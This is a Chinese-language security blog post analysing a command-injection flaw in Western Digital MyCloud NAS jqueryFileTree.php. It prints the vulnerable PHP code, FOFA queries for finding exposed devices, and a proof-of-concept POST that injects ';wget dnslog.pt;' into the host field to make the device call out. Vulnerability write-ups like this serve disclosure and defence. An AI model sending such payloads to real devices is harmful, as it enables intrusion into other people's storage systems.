---
title: "西部数码 NAS jqueryFileTree.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html
asset_dir: assets/西部数码-nas-jqueryfiletree.php-命令执行漏洞
---

# 西部数码 NAS jqueryFileTree.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/12 10:13
- 673浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

文件传输协议

MyCloud NAS

网页服务器

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS jqueryFileTree.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `jqueryFileTree.php` 其业务实现逻辑如下

```
<?php
//
// jQuery File Tree PHP Connector
//
// Version 1.01
//
// Cory S.N. LaViska
// A Beautiful Site (http://abeautifulsite.net/)
// 24 March 2008
//
// History:
//
// 1.01 - updated to work with foreign characters in directory/file names (12 April 2008)
// 1.00 - released (24 March 2008)
//
// Output a list of files for jQuery File Tree
//
//$dir = $_POST['dir'];
//$host = $_POST['host'];
//$pwd = $_POST['pwd'];
//$user = $_POST['user'];

$host = ($_POST['host'] == "")? $_GET['host']:$_POST['host'];
$pwd = ($_POST['pwd'] == "")? $_GET['pwd']:$_POST['pwd'];
$user = ($_POST['user'] == "")? $_GET['user']:$_POST['user'];
$dir = ($_POST['dir'] == "")? $_GET['dir']:$_POST['dir'];
$lang = ($_POST['lang'] == "")? $_GET['lang']:$_POST['lang'];
//echo $dir."dir1=".dir1;
error_reporting(0);

       @unlink("/tmp/ftp-folder.txt");
       @unlink("/tmp/ftp-file.txt");

       $cmd = sprintf("ftp_download -c gettree -i \"%s\" -u \"%s\" -p \"%s\" -t \"%s\" -l \"%s\"", $host, $user, $pwd ,$dir ,$lang);

       $handle = popen($cmd, 'r');
```

深入探索

漏洞预警服务

恶意软件分析工具

企业安全咨询

多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。

# 漏洞复现

```
POST /web/addons/jqueryFileTree.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

host=";wget dnslog.pt;"
```

[![西部数码 NAS jqueryFileTree.php 命令执行漏洞](images/img-001-4e555cc7e7f3.webp)](https://image.mrxn.net/8ca39413f297481e8ce5691a5d8e208e.webp)

在DNSLOG平台成功收到DNS和HTTP请求

计算机驱动器和存储设备

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
